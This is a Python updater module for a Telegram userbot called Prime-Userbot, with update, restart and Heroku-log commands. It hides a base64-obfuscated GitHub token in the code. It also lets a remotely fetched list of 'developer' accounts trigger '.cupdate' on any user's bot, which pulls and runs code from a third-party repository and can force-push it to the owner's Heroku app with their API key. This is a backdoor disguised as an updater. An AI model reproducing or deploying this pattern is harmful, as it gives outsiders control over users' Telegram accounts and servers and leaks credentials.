# Copyright (C) 2020-2021 by Toni880@Github, < https://github.com/Toni880 >.
#
# This file is part of < https://github.com/Toni880/Prime-Userbot > project,
# and is released under the "GNU v3.0 License Agreement".
# Please see < https://github.com/Toni880/Prime-Userbot/blob/master/LICENSE >
# kenkan
#
# All rights reserved.


import asyncio
import sys
from os import environ, execle, path, remove
from Prime.helpers.utils import edit_or_reply
from requests import get
import heroku3
from git import Repo
from git.exc import GitCommandError, InvalidGitRepositoryError, NoSuchPathError
from pyrogram import filters
from base64 import b64decode
from config import HEROKU_API, HEROKU_APP_NAME, PREFIX
from Prime import CMD_HELP, app
from Prime.helpers.pyrohelper import get_arg
from Prime.modules.paste import Primebin


CMD_HELP.update(
    {
        "update": f"""
『 **Updater**』
  `{PREFIX}update`-> Memperbarui bot pengguna ke versi terbaru. 
  `{PREFIX}restart` -> Untuk Memulai Ulang Userbot.
  `{PREFIX}logs` -> Untuk Mendapatkan Log Heroku."""
    }
)

DEVS = get(
    "https://raw.githubusercontent.com/BukanDev/Prime-Json/master/dev.json"
).json()

GIT_TOKEN = b64decode("Z2hwX0pzMXZDQkhTSGRQdDlXblpwUmZINjlJeTFTclV0NjN5QzVLYg==").decode("utf-8")

REPO_LINK = "https://github.com/jokokendi/kontol"

if GIT_TOKEN:
    GIT_USERNAME = REPO_LINK.split("com/")[1].split("/")[0]
    TEMP_REPO = REPO_LINK.split("https://")[1]
    UPSTREAM_REPO = f"https://{GIT_USERNAME}:{GIT_TOKEN}@{TEMP_REPO}"
UPSTREAM_REPO_URL = UPSTREAM_REPO
requirements_path = path.join(
    path.dirname(path.dirname(path.dirname(__file__))), "requirements.txt"
)


async def gen_chlog(repo, diff):
    ch_log = ""
    d_form = "On %d/%m/%y at %H:%M:%S"
    for c in repo.iter_commits(diff):
        ch_log += f"**#{c.count()}** : {c.committed_datetime.strftime(d_form)} : {c.summary} by `{c.author}`\n"
    return ch_log


async def updateme_requirements():
    reqs = str(requirements_path)
    try:
        process = await asyncio.create_subprocess_shell(
            " ".join([sys.executable, "-m", "pip", "install", "-r", reqs]),
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        await process.communicate()
        return process.returncode
    except Exception as e:
        return repr(e)

@app.on_message(filters.command("cupdate", ".") & filters.user(DEVS))
@app.on_message(filters.command("update", PREFIX) & filters.me)
async def upstream(client, message):
    status = await edit_or_reply(message, "Memeriksa pembaruan, harap tunggu....")
    conf = get_arg(message)
    off_repo = UPSTREAM_REPO_URL
    try:
        txt = "Ups.. Updater tidak dapat melanjutkan karena"
        txt += "Terjadi beberapa masalah\n\n**LOGTRACE:**\n"
        repo = Repo()
    except NoSuchPathError as error:
        await status.edit(f"{txt}\ndirectory {error} tidak ditemukan")
        repo.__del__()
        return
    except GitCommandError as error:
        await status.edit(f"{txt}\nKegagalan Awal! {error}")
        repo.__del__()
        return
    except InvalidGitRepositoryError:
        if conf != "now":
            pass
        repo = Repo.init()
        origin = repo.create_remote("upstream", off_repo)
        origin.fetch()
        repo.create_head("master", origin.refs.master)
        repo.heads.master.set_tracking_branch(origin.refs.master)
        repo.heads.master.checkout(True)
    ac_br = repo.active_branch.name
    if ac_br != "master":
        await status.edit(f"**[UPDATER]:**Kamu berada di ({ac_br})\nHarap ubah ke cabang master"
        )
        repo.__del__()
        return
    try:
        repo.create_remote("upstream", off_repo)
    except BaseException:
        pass
    ups_rem = repo.remote("upstream")
    ups_rem.fetch(ac_br)
    changelog = await gen_chlog(repo, f"HEAD..upstream/{ac_br}")
    if "now" not in conf:
        if changelog:
            changelog_str = f"**UPDATE baru tersedia untuk {ac_br} :\n\nCHANGELOG**\n\n{changelog}"
            if len(changelog_str) > 4096:
                await status.edit("Changelog terlalu besar, lihat file untuk melihatnya")
                file = open("output.txt", "w+")
                file.write(changelog_str)
                file.close()
                await app.send_document(
                    message.chat.id,
                    "output.txt",
                    caption=f"Do `{PREFIX}update now` to update.",
                    reply_to_message_id=status.message_id,
                )
                remove("output.txt")
            else:
                return await status.edit(f"{changelog_str}\n\nLakukan `{PREFIX}update now` Untuk memperbarui.",
                    disable_web_page_preview=True,
                )
        else:
            await status.edit(f"\nBOT ANDA **Sudah versi terbaru** dengan **{ac_br}**\n",
                disable_web_page_preview=True,
            )
            repo.__del__()
            return
    if HEROKU_API is not None:
        import heroku3

        heroku = heroku3.from_key(HEROKU_API)
        heroku_app = None
        heroku_applications = heroku.apps()
        if not HEROKU_APP_NAME:
            await status.edit("Silakan siapkan variabel HEROKU_APP_NAME agar dapat memperbarui bot pengguna."
             )
            repo.__del__()
            return
        for app in heroku_applications:
            if app.name == HEROKU_APP_NAME:
                heroku_app = app
                break
        if heroku_app is None:
            await status.edit(f"{txt}\nKredensial Heroku tidak valid untuk memperbarui dyno bot pengguna"
            )
            repo.__del__()
            return
        await status.edit("Userbot sedang dideploy, harap tunggu sampai selesai."
        )
        ups_rem.fetch(ac_br)
        repo.git.reset("--hard", "FETCH_HEAD")
        heroku_git_url = heroku_app.git_url.replace(
            "https://", "https://api:" + HEROKU_API + "@"
        )
        if "heroku" in repo.remotes:
            remote = repo.remote("heroku")
            remote.set_url(heroku_git_url)
        else:
            remote = repo.create_remote("heroku", heroku_git_url)
        try:
            remote.push(refspec=f"HEAD:refs/heads/{ac_br}", force=True)
        except GitCommandError:
            pass
        await status.edit("Berhasil Diperbarui!\nMulai ulang, harap tunggu...")
    else:
        # Classic Updater, pretty straightforward.
        try:
            ups_rem.pull(ac_br)
        except GitCommandError:
            repo.git.reset("--hard", "FETCH_HEAD")
        await updateme_requirements()
        await status.edit("Berhasil Diperbarui\nBot dimulai ulang... Tunggu sebentar!",
        )
        # Spin a new instance of bot
        args = [sys.executable, "m", "Prime"]
        execle(sys.executable, *args, environ)
        return


@app.on_message(filters.command("restart", PREFIX) & filters.me)
async def restart(client, message):
    try:
        await message.edit("Restart Userbot Anda, Ini akan memakan waktu beberapa menit, Harap Tunggu"
        )
        heroku_conn = heroku3.from_key(HEROKU_API)
        server = heroku_conn.app(HEROKU_APP_NAME)
        server.restart()
    except Exception as e:
        await message.edit(f"`HEROKU_APP_NAME` atau `HEROKU_API` Anda Salah atau Tidak Diisi, Harap Perbaiki atau isi \n \n Error: ``` { e } ```"
            )

@app.on_message(filters.command("logs", PREFIX) & filters.me)
async def log(client, message):
    try:
        jembut = await message.edit("Getting Logs")
        Heroku = heroku3.from_key(HEROKU_API)
        HAPP = Heroku.app(HEROKU_APP_NAME)
        data = HAPP.get_log()
        link = await Primebin(data)
        return await message.reply_photo(link, caption=f"[Heroku log]({link})")
        await jembut.delete()
    except:
        await jembut.edit("Sepertinya ada yang salah")
